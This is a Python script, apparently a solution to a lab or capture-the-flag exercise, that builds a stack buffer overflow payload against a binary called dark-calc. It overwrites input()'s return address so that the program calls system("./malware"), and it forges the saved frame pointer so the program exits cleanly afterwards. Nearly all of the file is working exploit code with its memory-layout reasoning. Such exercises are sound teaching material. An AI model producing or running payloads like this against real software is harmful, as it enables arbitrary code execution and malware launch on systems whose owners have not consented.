#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Goal: exploit the stack buffer overflow in ``input()`` and hijack its return
address so that ``system("./malware")`` gets executed.

Frame layout of ``input()`` (see ``objdump -d attack/dark-calc``):

    rbp-0x10 : char expression[16]      <- gets() destination
    rbp+0x00 : saved rbp
    rbp+0x08 : return address

so the payload is

    "./malware\\0" + padding (16 bytes) | 8 bytes (saved rbp) | new return address

The new return address is 0x401a6b = ``eval``+0x94, i.e. the instruction
``mov edi, 0x6030d0 (command_buf)`` right before ``call system@plt``.
``input()`` has already done ``strcpy(command_buf, expression)`` with our
string, so ``system()`` receives exactly ``./malware`` (the NUL terminator of
the C string stops that copy; the rest of the payload is only written by
``gets()`` and never reaches ``command_buf``).

Because ``dark-calc`` installs its stack at a fixed address, we can also give
the *saved rbp* a valid value and let the program terminate cleanly instead of
crashing after the bomb went off: ``eval``'s epilogue does
``leave; ret`` -- with ``saved rbp = 0x721000800fe8`` it pops our next qword
into rbp and returns to ``main``, which sees EOF on stdin and exits normally.

    0x721000800fd0 : "./malware\\0" + padding        expression[16]
    0x721000800fe0 : 0x721000800fe8                  saved rbp (fixed stack!)
    0x721000800fe8 : 0x401a6b                        return address -> system()
    0x721000800ff0 : 0x401ac3 (main)                 where eval()'s leave/ret goes
"""
import struct
import sys

COMMAND_BUF = 0x6030D0   # address of the global command_buf (mov edi, imm32)
SYSTEM_CALL = 0x401A6B   # eval+0x94: mov edi, command_buf; call system@plt
STACK_RBP = 0x721000800FE8
MAIN = 0x401AC3

payload = b"./malware\x00"
payload += b"A" * (0x10 - len(payload))         # fill up the 16-byte expression[]
payload += struct.pack("<Q", STACK_RBP)         # saved rbp  -> chain on the stack
payload += struct.pack("<Q", SYSTEM_CALL)       # return address -> system("./malware")
payload += struct.pack("<Q", MAIN)              # eval()'s leave/ret -> main -> exit(0)

assert b"\n" not in payload
sys.stdout.buffer.write(payload + b"\n")
